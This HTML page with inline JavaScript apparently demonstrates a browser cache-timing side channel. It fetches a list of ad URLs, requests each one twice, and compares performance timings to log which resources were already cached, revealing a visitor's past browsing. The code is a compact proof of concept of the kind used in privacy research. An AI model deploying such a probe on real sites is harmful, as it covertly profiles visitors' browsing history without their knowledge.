<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Image inference through caching</title>
    <input type="checkbox" name="vehicle" value="Car" id="isCookie">
</head>
<body>
<script type="text/javascript">

    function httpGetAsync(theUrl, callback)
    {
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.onreadystatechange = function() {
            if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
                callback(xmlHttp.responseText);
        }
        xmlHttp.open("GET", theUrl, true); // true for asynchronous
        xmlHttp.send(null);
    }

    httpGetAsync('/adUrls', function(response) {
        var urls = response.split('\n');

        urls.forEach(function(url, counter) {
            var xmlHttp1 = new XMLHttpRequest();
            var xmlHttp2 = new XMLHttpRequest();

            xmlHttp1.onreadystatechange = function() {
                if (xmlHttp1.readyState == 4 && xmlHttp1.status == 200) {
                    xmlHttp2.open("GET", url, true); // true for asynchronous
                    xmlHttp2.send(null);
                }
            };

            xmlHttp2.onreadystatechange = function() {
                if (xmlHttp2.readyState == 4 && xmlHttp2.status == 200) {
                    var current = window.performance.getEntries().filter(function(entry) {
                        if (entry.name === url) {
                            return true;
                        }
                    });

                    if (current.length == 2) {
                        console.log("difference: " + Math.abs(current[0].duration - current[1].duration));
                        if (Math.abs(current[0].duration - current[1].duration) > 15) {
                            console.log("This url was NOT cached: " + url);
                        } else {
                            console.log("This url WAS cached: " + url);
                        }
                    }
                }
            };

            xmlHttp1.open("GET", url, true); // true for asynchronous
            xmlHttp1.setRequestHeader("Accept","text/plain");
            xmlHttp1.send(null);
        });
    });

</script>

</body>

</html>